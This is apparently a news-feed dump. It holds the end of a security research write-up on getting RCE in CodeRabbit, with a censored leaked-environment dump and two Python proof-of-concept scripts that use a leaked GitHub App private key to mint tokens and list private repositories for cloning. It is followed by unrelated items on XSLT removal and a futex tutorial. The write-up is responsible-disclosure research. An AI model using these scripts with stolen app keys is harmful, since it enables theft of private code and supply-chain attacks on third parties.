  "K_REVISION": "pr-reviewer-saas-(CENSORED)",
  "K_SERVICE": "pr-reviewer-saas",
  "LANGCHAIN_API_KEY": "(CENSORED)",
  "LANGCHAIN_PROJECT": "default",
  "LANGCHAIN_TRACING_SAMPLING_RATE_CR": "50",
  "LANGCHAIN_TRACING_V2": "true",
  "LANGUAGETOOL_API_KEY": "(CENSORED)",
  "LANGUAGETOOL_USERNAME": "(CENSORED)",
  "LD_LIBRARY_PATH": "/usr/local/lib:/usr/lib:/lib:/usr/libexec/swift/5.10.1/usr/lib",
  "LINEAR_PAT": "",
  "LLM_PROVIDER": "",
  "LLM_TIMEOUT": "300000",
  "LOCAL": "false",
  "NODE_ENV": "production",
  "NODE_VERSION": "22.9.0",
  "NPM_CONFIG_REGISTRY": "http://(CENSORED)",
  "OAUTH2_CLIENT_ID": "",
  "OAUTH2_CLIENT_SECRET": "",
  "OAUTH2_ENDPOINT": "",
  "OPENAI_API_KEYS": "sk-proj-(CENSORED)",
  "OPENAI_API_KEYS_FREE": "sk-proj-(CENSORED)",
  "OPENAI_API_KEYS_OSS": "sk-proj-(CENSORED)",
  "OPENAI_API_KEYS_PAID": "sk-proj-(CENSORED)",
  "OPENAI_API_KEYS_TRIAL": "sk-proj-(CENSORED)",
  "OPENAI_BASE_URL": "",
  "OPENAI_ORG_ID": "",
  "OPENAI_PROJECT_ID": "",
  "PATH": "/pnpm:/usr/local/go/bin:/root/.local/bin:/swift/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
  "PINECONE_API_KEY": "(CENSORED)",
  "PINECONE_ENVIRONMENT": "us-central1-gcp",
  "PNPM_HOME": "/pnpm",
  "PORT": "8080",
  "POSTGRESQL_DATABASE": "(CENSORED)",
  "POSTGRESQL_HOST": "(CENSORED)",
  "POSTGRESQL_PASSWORD": "(CENSORED)",
  "POSTGRESQL_USER": "(CENSORED)",
  "PWD": "/inmem/21/d277c149-9d6a-4dde-88cc-03f724b50e2d/home/jailuser/git",
  "REVIEW_EVERYTHING": "false",
  "ROOT_COLLECTION": "",
  "SELF_HOSTED": "",
  "SELF_HOSTED_KNOWLEDGE_BASE": "",
  "SELF_HOSTED_KNOWLEDGE_BASE_BRANCH": "",
  "SENTRY_DSN": "https://(CENSORED)",
  "SERVICE_NAME": "pr-reviewer-saas",
  "SHLVL": "0",
  "TELEMETRY_COLLECTOR_URL": "https://(CENSORED)",
  "TEMP_PATH": "/inmem",
  "TINI_VERSION": "v0.19.0",
  "TRPC_API_BASE_URL": "https://(CENSORED)",
  "VECTOR_COLLECTION": "",
  "YARN_VERSION": "1.22.22",
  "_": "/usr/local/bin/rubocop"
}
</pre></div>


<p>That payload contained so many secrets that it actually took me a few minutes to grasp what we had gotten access to. The environment variables contained, notably:</p>



<ul>
<li>Anthropic API keys (free, oss, paid, trial, etc.)</li>



<li>OpenAI API keys (free, oss, paid, trial, etc.)</li>



<li>Aperture agent key</li>



<li>Courier auth token</li>



<li>Encryption password and salt</li>



<li>Gitlab personal access token</li>



<li>CodeRabbit GitHub App private key, app client id, app client secret, app id</li>



<li>Jira secret</li>



<li>Langchain/langsmith API key</li>



<li>LanguageTool API key</li>



<li>Pinecone API key</li>



<li>PostgreSQL database host, username and password</li>
</ul>



<p>Leaking environment variables is one thing, but since we obtained remote code execution (RCE) on that server, there is even more that an attacker could have done. Indeed, they could connect to the Postgres database server on the internal network. They could perform destructive operations. They could likely obtain the source code of the CodeRabbit app itself which is potentially somewhere in the Docker container where the external tool runs.</p>



<p>Before exploring the leaked environment variables further, we performed a few minimal reconnaissance operations, such as listing a few directories and reading the contents of a couple files on the production system, just to confirm the impacts. But this process was not really efficient and we were not able to quickly confirm the presence of the original source code of the CodeRabbit webapp there. However, the built application was there in the <code>/app/pr-reviewer-saas/dist</code> directory.<br>Additionally, since this was a production server, we didn’t want to do anything that could disrupt the CodeRabbit service and decided to stop there.<br>But there was more. Let’s go back to the exfiltrated environment variables.</p>



<h2>Getting Read/write access to 1M repositories</h2>



<p>As mentioned above, one of the environment variables was named <code>GITHUB_APP_PEM_FILE</code> and its value contained a private key. This is actually the private key of the CodeRabbit GitHub app. This private key can be used to authenticate to the GitHub REST API and act on behalf of the CodeRabbit GitHub app. Since users of CodeRabbit have granted CodeRabbit write access to their repositories, this private key gives us write access to 1 million repositories!</p>



<p>Let’s go through a few operations that one can perform with this private key.</p>



<h3>Listing installations of the CodeRabbit app</h3>



<p>As of writing, the CodeRabbit GitHub app was installed over 80’000 times. Basically, this tells us that at least that amount of GitHub personal accounts or organizations installed CodeRabbit and use it for at least one of their repositories. But these accounts may very well have granted access to more than one repository, or even all of their repositories.</p>



<p>The CodeRabbit website states that they review 1M repositories. These include GitHub repositories, but likely also repositories from other platforms that CodeRabbit supports, such as Gitlab, and on-premises git providers.</p>



<p>We will see below (see Proof of concept) how one can programatically list GitHub app installations using the GitHub API.</p>



<h3>Listing GitHub repositories CodeRabbit has access to</h3>



<p>For a given installation, one can list the GitHub repositories to which this installation has been granted access.</p>



<p>We can also see that the installation has read/write access to the code of the repository, among other permissions. For reference, this is the list of permissions the CodeRabbit app has on the repositories it has access to:</p>


<div><pre title="">"permissions": {
    "actions": "read",
    "checks": "read",
    "contents": "write",
    "discussions": "read",
    "issues": "write",
    "members": "read",
    "metadata": "read",
    "pull_requests": "write",
    "statuses": "write"
  },
</pre></div>


<p>Note that these permissions are public information that anyone can <a href="https://api.github.com/apps/coderabbitai">see here</a>.</p>



<h3>Generating an access token valid for repositories that CodeRabbit has access to</h3>



<p>A GitHub API access token can be created for the CodeRabbit app installation. This access token has all the permissions listed above and can be used on all the repositories the app installation has access to. It can be used to, for example, clone the repository or push git commits to it, since we not only have read access but also write access to the <code>contents</code>. This can also be used to update GitHub releases, including the downloadable files (the assets), and replace them with malware and therefore serve malware directly from the targeted official GitHub repository.</p>



<p>The access token is valid for at most 10 minutes, but since we have the private key, more access tokens can be generated at any time, even if they expire.</p>



<h3>Cloning private repositories CodeRabbit has access to</h3>



<p>But this gets even scarier. Generated access tokens can also be used to clone private repositories (!) that the user has granted CodeRabbit access to. Indeed, as long as the user has granted CodeRabbit access to a repository, the private key can be used to access it. It doesn’t matter if it’s public or private.<br>Therefore, a malicious person could exploit the vulnerability to leak the CodeRabbit GitHub app private key, list all the installations, list each repository, generate an access token for each repository, and clone private repositories, serve malware from public repositories or manipulate the git history of a repository. This could be used to perform lateral movement and potentially leak GitHub repository secrets of the GitHub repository through GitHub actions if the targeted repository contains vulnerable GitHub actions.</p>



<h2>Proof of concept</h2>



<p>Here’s an example of how this can be achieved using the PyGitHub Python library, assuming that the private key is stored in a file called <code>priv.pem</code> and that we have the app ID and client ID (also leaked from the environment variables):</p>


<div><pre title="">#!/usr/bin/env python3  
import json  
import time  

import jwt  
import requests  
from github import Auth, GithubIntegration  

with open("priv.pem", "r") as f:  
    signing_key = f.read()  

app_id = "TODO_insert_app_id_here"  
client_id = "Iv1.TODO_insert_client_id_here"  


def gen_jwt():  
    payload = {  
        # Issued at time  
        'iat': int(time.time() - 60),  
        # JWT expiration time (10 minutes maximum)  
        'exp': int(time.time()) + 600 - 60,  
        # GitHub App's client ID  
        'iss': client_id  
    }  

    # Create JWT  
    encoded_jwt = jwt.encode(payload, signing_key, algorithm="RS256")  
    return encoded_jwt  


def create_access_token(install_id, jwt):  
    response = requests.post(  
        f"https://api.github.com/app/installations/{install_id}/access_tokens",  
        headers={  
            "Accept": "application/vnd.github+json",  
            "Authorization": f"Bearer {jwt}",  
            "X-GitHub-Api-Version": "2022-11-28",  
        }  
    )  
    j = response.json()  
    access_token = j["token"]  
    return access_token  


def auth():  
    auth = Auth.AppAuth(app_id, signing_key)  
    gi = GithubIntegration(auth=auth)  
    app = gi.get_app()  

    # iterate through app installations, get the first 5  
    for installation in gi.get_installations().reversed[:5]:  
        install_id = installation.id  

    # or access an installation by its ID directly  
    installation = gi.get_app_installation(install_id)  

    jwt = gen_jwt()  
    create_access_token(install_id, jwt)  

    # get all github repositories this installation has access to  
    repos = installation.get_repos()  
    for repo in repos:  
        full_name = repo.full_name  
        stars = repo.stargazers_count  
        html_url = repo.html_url  
        is_private_repo = repo.private  
        clone_url = f"https://x-access-token:{access_token}@github.com/{full_name}.git"  
        print(clone_url)  

        # repo can be cloned with "git clone {clone_url}"  
        # access token is valid for 10 minutes, but a new one can be generated whenever needed  

if __name__ == "__main__":  
    auth()
</pre></div>


<p>Obviously, iterating through the list of all GitHub installations of the CodeRabbit app would have required making thousands of requests to the GitHub API on behalf of the production CodeRabbit GitHub app and this may have exceeded the API quota. We didn’t want to risk disrupting the production CodeRabbit service so we only iterated through a couple installations to confirm the PoC was working.</p>



<h2>Leaking CodeRabbit’s private repositories</h2>



<p>We mentioned earlier that we couldn’t confirm the presence of the original source code of CodeRabbit on the production Docker container. Well, since CodeRabbit eats their own dog food, they run CodeRabbit on their own GitHub repositories. We can therefore easily retrieve the app installation ID for their GitHub organization and list the repositories this app installation has access to.</p>



<p>This is the list of private repositories the coderabbitai GitHub organization has granted CodeRabbit access to:</p>



<ul>
<li><a href="https://github.com/coderabbitai/mono" rel="nofollow">https://github.com/coderabbitai/mono</a></li>



<li><a href="https://github.com/coderabbitai/pr-reviewer-saas" rel="nofollow">https://github.com/coderabbitai/pr-reviewer-saas</a></li>



<li><a href="https://github.com/coderabbitai/e2e-reviewer" rel="nofollow">https://github.com/coderabbitai/e2e-reviewer</a></li>



<li><a href="https://github.com/coderabbitai/pr-reviewer-client" rel="nofollow">https://github.com/coderabbitai/pr-reviewer-client</a></li>



<li><a href="https://github.com/coderabbitai/db-client" rel="nofollow">https://github.com/coderabbitai/db-client</a></li>



<li><a href="https://github.com/coderabbitai/rabbits-lab" rel="nofollow">https://github.com/coderabbitai/rabbits-lab</a></li>



<li><a href="https://github.com/coderabbitai/website" rel="nofollow">https://github.com/coderabbitai/website</a></li>



<li><a href="https://github.com/coderabbitai/hubspot-reporting" rel="nofollow">https://github.com/coderabbitai/hubspot-reporting</a></li>
</ul>



<p>To go further, one can generate an access token (as explained above) and clone these private repositories, including what looks like their monorepo (<code>coderabbitai/mono</code>) or the <code>coderabbitai/pr-reviewer-saas</code> repository.</p>



<p>Here’s the PoC to do this. Note that it’s similar to the above, except that we directly retrieve the app installation for a specific GitHub organization by its name, instead of iterating through all the installations:</p>


<div><pre title="">#!/usr/bin/env python3  
import time  

import jwt  
import requests  
from github import Auth, GithubIntegration  

with open("priv.pem", "r") as f:  
    signing_key = f.read()  

app_id = "CENSORED"  
client_id = "CENSORED"  


def gen_jwt():  
    payload = {  
        # Issued at time  
        'iat': int(time.time() - 60),  
        # JWT expiration time (10 minutes maximum)  
        'exp': int(time.time()) + 600 - 60,  
        # GitHub App's client ID  
        'iss': client_id  
    }  

    # Create JWT  
    encoded_jwt = jwt.encode(payload, signing_key, algorithm="RS256")  
    return encoded_jwt  


def auth():  
    auth = Auth.AppAuth(app_id, signing_key)  
    gi = GithubIntegration(auth=auth)  

    # Target a specific Github organization that uses CodeRabbit  
    org = "coderabbitai"    
    installation = gi.get_org_installation(org)  

    # Target a specific Github user that uses CodeRabbit
    # user = "amietn"  
    # installation = gi.get_user_installation(user)  

    print(installation.id)  
    gen_token = True  

    if gen_token:  
        jwt = gen_jwt()  
        response = requests.post(  
            f"https://api.github.com/app/installations/{installation.id}/access_tokens",  
            headers={  
                "Accept": "application/vnd.github+json",  
                "Authorization": f"Bearer {jwt}",  
                "X-GitHub-Api-Version": "2022-11-28",  
            }  
        )  
        j = response.json()  
        access_token = j["token"]  

    repos = installation.get_repos()  
    print("---repos---")  
    for repo in repos:  
        full_name = repo.full_name  
        html_url = repo.html_url  
        private = repo.private  
        if private:  
            print(f"* {full_name} ({private=}) - {html_url}")  

            if gen_token:  
                clone_url = f"https://x-access-token:{access_token}@github.com/{full_name}.git"  
                print(clone_url)  


if __name__ == "__main__":  
    auth()
</pre></div>


<p>In a similar way, a malicious person could target not only a specific GitHub organization but also a specific GitHub personal account that uses CodeRabbit and access their private repositories and/or modify them.</p>



<p>As you can see, one can directly obtain the app installation ID for an organization or a user. So, this way there is no need to iterate through all the GitHub app installations to find a specific GitHub user or organization. Only the organization or user’s name is required.</p>



<h2>Impacts summary</h2>



<p>Let’s take a moment to summarize the impacts of getting write access to these 1 million repositories. A malicious person could have performed the following operations on affected repositories:</p>



<ul>
<li>Access private GitHub repositories nobody was ever supposed to access. This is a privacy breach.</li>



<li>Modify the git history of affected GitHub repositories – Note that this can be a supply chain attack since GitHub repositories are often the source for building software before it’s distributed</li>



<li>Modify existing GitHub releases and replace or add malicious downloadable files – Supply chain attack</li>



<li>Further lateral moves to potentially leak GitHub repository secrets by exploiting existing vulnerable GitHub actions by pushing git commits – Note that since the CodeRabbit GitHub app doesn’t have write permission to workflows, GitHub actions can’t be directly modified. However, a vulnerable GitHub action may be exploited more easily with write access to the git repository. See the talk I gave at 38C3 for more details on how we found an instance where this was exploitable.</li>
</ul>



<p>Additionally, we obtained RCE on the CodeRabbit production system. A malicious person could have performed destructive operations, caused a denial of service, or performed malicious operations on third party systems (see list of leaked secrets above).</p>



<h2>Context is key</h2>



<p>While running the exploit, CodeRabbit would still review our pull request and post a comment on the GitHub PR saying that it detected a critical security risk, yet the application would happily execute our code because it wouldn’t understand that this was actually running on their production system.</p>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png"><img data-attachment-id="20121" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/coderabbit-review/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png" data-orig-size="1983,1224" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="coderabbit-review" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png?w=840" loading="lazy" width="1024" height="632" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png?w=1024" alt=""></a><figcaption>CodeRabbit’s code review of the exfiltration PoC PR</figcaption></figure>



<h2>Remediation</h2>



<p>CodeRabbit supports running dozens of external tools. These tools may get updates and new tools may be supported. Both cases may open the door to new ways of running arbitrary code. Therefore, trying to prevent arbitrary code execution through these tools sounds like an impossible task.</p>



<p>Instead, it would be best to assume that the user may be able to run untrusted code through these tools. So, running them in an isolated environment, with only the minimum information required to run the tools themselves, and not passing them any environment variables would be much better. Even if arbitrary code execution would be possible, the impact would be much less severe.</p>



<p>For defense in depth, one should add a mechanism that prevents sending private information to an attacker-controlled server. For example, only allow outgoing traffic to whitelisted hosts, if possible. If the tool doesn’t require internet access, then all network traffic may even be disabled in that isolated environment. This way it would make it harder for an attacker to exfiltrate secrets.</p>



<h2>Responsible disclosure</h2>



<p>After responsibly disclosing this critical vulnerability to the CodeRabbit team, we learned from them that they had an isolation mechanism in place, but Rubocop somehow was not running inside it. The CodeRabbit team was extremely responsive and acknowledged receipt of the disclosure the same day. They immediately disabled Rubocop and rotated the secrets and started working on a fix. The next week they told us that the vulnerability had been fixed. Kudos to the CodeRabbit team for responding promptly and fixing the issue.</p>



<p>Here is a summary of the disclosure timeline:</p>



<ul>
<li>January 24, 2025:
<ul>
<li>Disclose vulnerability to CodeRabbit</li>



<li>CodeRabbit acknowledges vulnerability and confirms they are working on a fix</li>
</ul>
</li>



<li>January 30, 2025:
<ul>
<li>CodeRabbit confirms fix</li>
</ul>
</li>
</ul>



<h2>Conclusions</h2>



<p>In the end, we only provided PoCs and didn’t take things further. A patient attacker could have enumerated the available access, identified the highest value targets, and then attacked those targets to distribute malware to countless others in a larger supply chain attack. Security is hard, and a variety of factors can come together to create security issues. Being quick to respond and remediate, as the CodeRabbit team was, is a critical part of addressing vulnerabilities in modern, fast-moving environments. Other vendors we contacted never responded at all, and their products are still vulnerable.</p>



<p>In the race to bring AI-powered products to market, many companies prioritize speed over security. While rapid innovation is exciting, overlooking security can have catastrophic consequences, as we’ve seen. The solution isn’t to stop but to build security into the development process from day one. By making security a core priority, AI companies can create products that are not only groundbreaking but also resilient and responsible. After all, true innovation isn’t just about moving fast. It’s about building something resilient and safe for users.</p>

		
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Chrome intends to remove XSLT from the HTML spec (272 pts)]]></title>
            <link>https://github.com/whatwg/html/pull/11563</link>
            <guid>44952185</guid>
            <pubDate>Tue, 19 Aug 2025 14:48:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/whatwg/html/pull/11563">https://github.com/whatwg/html/pull/11563</a>, See on <a href="https://news.ycombinator.com/item?id=44952185">Hacker News</a></p>
<div id="readability-page-1" class="page"><div disabled="" sortable="">
          <p dir="auto">First, my apologies for commenting here; <a data-error-text="Failed to load title" data-id="3285251497" data-permission-text="Title is private" data-url="https://github.com/whatwg/html/issues/11523" data-hovercard-type="issue" data-hovercard-url="/whatwg/html/issues/11523/hovercard" href="https://github.com/whatwg/html/issues/11523">#11523</a> was (rightfully) locked while I was in the middle of composing this comment, but I didn't see any of these points mentioned elsewhere in that thread, so I'm adding it here.</p>
<hr>
<ol dir="auto">
<li>
<p dir="auto">Do any of your usage statistics show the age and “size” (popularity) of pages that use XSLT?</p>
<p dir="auto">Because if XSLT is mainly used by large commercial sites that are frequently updated, then deprecating the builtin support seems reasonable, since most of the sites will quickly update to include a polyfill. But if XSLT is mainly used by small personal sites that were last updated decades ago, then I wouldn't expect many of these sites to (ever) update, meaning that removing XSLT support would just mean that these sites will be broken forever.</p>
<p dir="auto">Given that XSLT has been supported since 1999 and its usage has been trending downwards, I suspect that the affected sites will mainly fall into the second category, meaning that the most likely outcome is site breakage rather than sites updating to use a polyfill.</p>
</li>
<li>
<p dir="auto">Well-built web pages use progressive enhancement, so even if any particular JavaScript/CSS feature is broken/removed, the page should still continue to partially work. So if JavaScript support for <code>XSLTProcessor()</code> is removed, then at the worst, all the JavaScript on a page will be broken, but the rest of the page should still be usable.</p>
<p dir="auto">However, removing support for <code>&lt;?xml-stylesheet … ?&gt;</code> seems particularly problematic, because if that is no longer supported, then users will simply see raw, unformatted XML, which makes the page completely unusable for non-technical users.</p>
</li>
<li>
<p dir="auto">Previous web platform deprecations have mainly affected JavaScript, and occasionally (or maybe never, I can't find any examples) CSS. Many legacy HTML features have been deprecated, but as far as I'm aware, all of them still work with all modern browsers. Some random examples:</p>
<ul dir="auto">
<li><a href="https://caniuse.com/mdn-html_elements_font" rel="nofollow"><code>&lt;font&gt;</code></a></li>
<li><a href="https://caniuse.com/mdn-html_elements_th_align" rel="nofollow"><code>align=</code></a></li>
<li><a href="https://caniuse.com/mdn-html_elements_xmp" rel="nofollow"><code>&lt;xmp&gt;</code></a></li>
</ul>
<p dir="auto">So while previous removals may have broken complex/interactive web apps, or may have caused minor format/layout changes, nothing has outright removed features used by pure “documents” (as in things that you could print on paper). However, many traditional documents use <code>&lt;?xml-stylesheet … ?&gt;</code>, so its removal seems unprecedented. But I may be completely wrong here, so please feel free to correct me.</p>
</li>
</ol>
<hr>
<p dir="auto">Personal note: I maintain a site that uses <code>XSLTProcessor()</code> interactively and that separately uses <code>&lt;?xml-stylesheet … ?&gt;</code> for RSS feeds; it would be slightly annoying if I had to add a polyfill, but I'd have no problem updating it before any browser changes are introduced, so no users will ever experience any breakage.</p>
<p dir="auto">However, my main concern is for the “long tail” of the web—there's lots of vital information only available on random university/personal websites last updated before 2005, or are only available on the <a href="https://archive.org/" rel="nofollow">Internet Archive</a>. Many of these sites use <code>&lt;?xml-stylesheet … ?&gt;</code> (and other obsolete features not discussed here like <code>&lt;frameset&gt;</code> and <code>&lt;font&gt;</code>), and it would be a real shame if these sites stopped working.</p>
      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Without the Futex, It's Futile (174 pts)]]></title>
            <link>https://h4x0r.org/futex/</link>
            <guid>44951563</guid>
            <pubDate>Tue, 19 Aug 2025 13:53:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://h4x0r.org/futex/">https://h4x0r.org/futex/</a>, See on <a href="https://news.ycombinator.com/item?id=44951563">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><main><article><div><p><a href="https://eatonphil.com/">Phil Eaton’s</a> <a href="https://eatonphil.com/2025-art-of-multiprocessor-programming.html">book club</a> is starting
<u>The Art of Multiprocessor Programming, 2nd Edition</u>
, which is a <em>very</em> well regarded textbook, and pretty recently updated (2021). I’ve even heard of a couple of authors.</p><p>I’ve done a lot of concurrent programming, and have always felt like I’ve still got plenty to learn, so I was excited for the topic. So far, what I’ve learned is that I would never recommend this book, despite any merits.</p><p>Academia certainly struggles to find the right balance between teaching foundational principles and practical information. Being this book is explicitly targeting fourth-year undergraduates and grad students, it should definitely cover the fundamentals, right?</p><p>So how the heck could it not cover the <em>futex</em>??</p><h2 id="isnt-that-just-a-type-of-mutex-surely-the-futex-cant-be-that-important">Isn’t that just a type of mutex? Surely the futex can’t be THAT important?</h2><p>The name sure sounds like “mutex”, and that <strong>is</strong> where the name comes from: “fast, user space mutex”. But, it isn’t really, it’s a building block for concurrency primitives that ushered in a modern world of concurrent performance that makes System V (sysv) feel so old and busted, it feels wrong to even call it a dinosaur 🦖, as if it were once mighty?</p><p>Way back in the last millennium, locking primitives were pretty much all based on the System V IPC (inter-process communication) code, specifically their semaphore code. All common concurrency primitives were over-complicated under the hood, and just didn’t scale well to large numbers of threads.</p><p>Until Linux added the futex.</p><p>Going back to the <a href="https://www.kernel.org/doc/ols/2002/ols2002-pages-479-495.pdf">original futuex paper</a> in 2002, it was immediately clear that the futex was a huge improvement in highly concurrent environments. Just in that original paper, their tests with 1000 parallel tasks ran <em>20-120 times faster</em> than sysv locks..🤯</p><p>Needless to say, other common operating systems followed suit, including Windows in 2012 and macOS by 2016.</p><p>These days, any <strong>good</strong> locking primitive is going to be based on a futex. You should expect system libraries like <code>pthreads</code> will use the futex extensively.</p><h2 id="wait-a-futex-isnt-a-mutex-so-what-is-it-then">Wait, a futex isn’t a mutex? So what is it, then?</h2><p>When there’s too much contention for a lock, actively trying to acquire it as fast as possible will just eat CPU that other threads could be using for work, to just sit there and wait.</p><p>It’d be nice to be able to clear up that CPU and put the thread to sleep until the lock is ready.</p><p>Unless you’re essentially going to build your own thread scheduling implementation in user-space (which is basically what async implementations do at their core), you either need to poll, which is inefficient, or you need operating system support.</p><p>In sysv IPC, the core tool for getting OS-supported blocking when building higher-level concurrency program was the <em>semaphore</em>, which <strong>intertwined locking and waiting</strong>.</p><p>The <em>futex</em> essentially separates the <em>locking</em> from <em>waiting (and waking)</em> tasks.</p><p>The flexibility you get from separating those two concerns is key to good lock performance. It becomes much easier to avoid unnecessary delays (like sleeps with exponential backoffs) and bottlenecks, particularly <strong>system calls themselves</strong>, which are quite expensive compared to most of the code involved in locking.</p><p>For instance, if you’re building a mutex, your unlock operation can skip calling into the kernel for the unlock operation if you can be confident in userland that no threads are waiting. In sysv land, an unlock was always a system call.</p><p>Essentially, the futex <code>wait()</code> call allows a task to block, queuing that task inside the kernel, on a list specifically associated with a particular memory address, and allows an optional timeout.</p><p>The <code>wake()</code> operation will dequeue threads from the internal list, running them again. You can choose how many to wake, but generally, the code will wake either 1 or all of them, never anything in between.</p><p>People often describe the futex as, <strong>“Wait on memory address”</strong>. That overlooks the notification side, but it’s a much more apt name, and why Windows’ name for this API (<code>WaitOnAddress</code>) is superior API naming (to be fair, they did have a decade to think about the name).</p><p>The memory address you’re waiting on tends to be a 32-bit integer, sometimes a 64-bit integer. The OS doesn’t care much about the semantics of the value inside that integer. However, and very importantly, when calling the <code>wait()</code> operation, the caller <em>must</em> present what it thinks the value of the futex is. If the value has changed, the operation fails.</p><p>Providing the value protects from waiting for a wake that has already happened. Whenever you need to wait, you’re waiting for some particular state to occur. The OS doesn’t care about the specifics of how your state is encoded in the futex, since it’s responsible for the order of operations on the futex; it won’t enqueue a waiter with an incorrect view of the current state.</p><p>For example, let’s say you’re a thread who wants to wait for state <code>Y</code> (which might be availability of a lock), and you have checked, and you think the state is <code>X</code> (say… locked). In the time from when you checked to the time of the wait, the state could actually be <code>Y</code>. And, if you’re using a more complicated concurrency primitive like a reader-writer lock, the state could have changed to <code>Z</code>.</p><p>The OS doesn’t need to care; it just knows when a task needs to take a long, hard look at its decisions. 👀🪞</p><h2 id="futex-the-ex-future-ie-the-present">Futex: the ex-future (i.e., the present)</h2><p>We’ve established it’s important, so let’s supplement the book with some of the content it should have had.</p><p>Being a low-level primitive, futexes are certainly hard to get right. The OS will make sure all operations on it from its perspective are well ordered, but when you modify state, not only to do you have to have confidence in your algorithm, you have to worry about the compiler or hardware performing relevent operations either out-of-order or in an overlapping way.</p><p>Still, it’s not <strong>too</strong> hard to build a basic mutex on top of a futex, and it’s a good exercise to start to show how we can often avoid unnecessary system calls.</p><p>Let’s start by building ourselves a little wrapper for <code>futex</code> that gives us access to the core functionality, and works across Linux and Mac. Other OSes are cool and all, yet still left as an exercise to the reader.</p><p>Our futex will be a 32-bit integer (I believe this is the only size on Linux still, so it’s the most portable). But when we use the thing for state management, we will want to play life safe and ensure that any work we do on the contents are guaranteed to be <em>sequentially consistent</em>, where there’s a linear order to the operations, and no thread would have seen anything inconsistent with that order.</p><table><tbody><tr><td>🏃🏿‍♂️</td><td>While many algorithms can work with much weaker consistency guarantees, we will generally avoid memory ordering optimization because it's so error prone, and often doesn't really make a significant difference for real-world programs. Just say no to premature optimization.</td></tr></tbody></table><p>To make it easier to get the full sequentially consistent experience, we will explicitly declare our futex to be atomic, even though the APIs we call probably will not explicitly declare them as such in formal parameter declarations. We’ll generally use an explicit atomic call for operations, but declaring variables atomic ensures that, when you don’t explicitly use an atomic operation to access, you get one anyway.</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>#include</span> <span>&lt;stdint.h&gt; // for uint32_t</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;stdatomic.h&gt;</span><span>
</span></span></span><span><span><span></span><span>typedef</span> <span>_Atomic</span>(<span>uint32_t</span>) <span>h4x0r_futex_t</span>;
</span></span></code></pre></div><p>On Linux, the main system call for the futex is a Swiss Army knife with many commands and options, both. Some of the features of the API turned out to be bad ideas, but endure because nobody wants to break code dependent on them. While the futex isn’t too hard in concept, the complexity of the Linux API is pretty staggering.</p><p>We’ll skip over all the complexity and just write a wrapper for the basic functionality under the assumption that you’re going to use futexes to build stuff within the context of a single process with threads (e.g., we won’t worry about locks shared between processes in this article).</p><p>Here’s the core functionality we need:</p><ol><li>The calling thread will wait <em>if the state is correct</em>.</li><li>The calling thread can specify an optional timeout.</li><li>We get back a result indicating success (<code>0</code>) or error (depends on why we didn’t wait, but both the race condition and timeout are valid reasons, as are interrupts).</li></ol><table><tbody><tr><td>🧵😴</td><td>Being explicit, if the return value is <code>0</code>, that means your thread slept, and welcome back from dreamland!</td></tr></tbody></table><p>In Linux, glibc doesn’t wrap the <code>futex</code> system call, so we’ll have to use their generic system call wrapper, <code>syscall</code>:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>#include</span> <span>&lt;time.h&gt; // For struct timespec.</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>#if defined(__linux__)
</span></span></span><span><span><span>#include</span> <span>&lt;linux/futex.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;sys/syscall.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;stdint.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>static</span> <span>inline</span> <span>int</span>
</span></span><span><span><span>h4x0r_futex_wait_timespec</span>(<span>h4x0r_futex_t</span>  <span>*</span>futex,
</span></span><span><span>                         <span>uint32_t</span>         expected,
</span></span><span><span>                         <span>struct</span> timespec <span>*</span>timeout_ptr)
</span></span><span><span>{
</span></span><span><span>    <span>int</span> err <span>=</span> <span>syscall</span>(SYS_futex,
</span></span><span><span>                      futex,
</span></span><span><span>                      FUTEX_WAIT_PRIVATE,
</span></span><span><span>                      expected,
</span></span><span><span>                      timeout_ptr,
</span></span><span><span>                      NULL,
</span></span><span><span>                      <span>0</span>);
</span></span><span><span>    <span>if</span> (err <span>==</span> <span>-</span><span>1</span>) {
</span></span><span><span>        <span>return</span> errno;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>return</span> <span>0</span>;
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>#endif
</span></span></span></code></pre></div><p>The <code>syscall()</code> wrapper doesn’t return the full error, just <code>-1</code>, which is why we have to check <code>errno</code>.</p><p>There, we return the error code (if any) from our wrapper, even though the system call returns -1 on an error, and then passes the specific error via <code>errno</code>.</p><p>Waking a thread up involves calling the same system call, but we just pass the corresponding wake operation:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>#include</span> <span>&lt;stdbool.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>#if defined(__linux__)
</span></span></span><span><span><span></span><span>static</span> <span>inline</span> <span>int</span>
